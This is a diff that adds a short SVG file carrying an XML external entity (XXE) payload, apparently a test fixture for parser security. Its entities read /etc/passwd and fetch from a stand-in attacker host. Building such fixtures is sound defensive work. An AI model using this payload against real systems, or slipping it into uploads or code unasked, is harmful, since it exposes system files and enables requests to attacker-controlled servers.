@@ -1,0 +1,8 @@
+<?xml version="1.0"?>
+<!DOCTYPE svg [
+  <!ENTITY local SYSTEM "file:///etc/passwd">
+  <!ENTITY remote SYSTEM "https://attacker.invalid/entity">
+]>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <text>&local;</text>
+</svg>
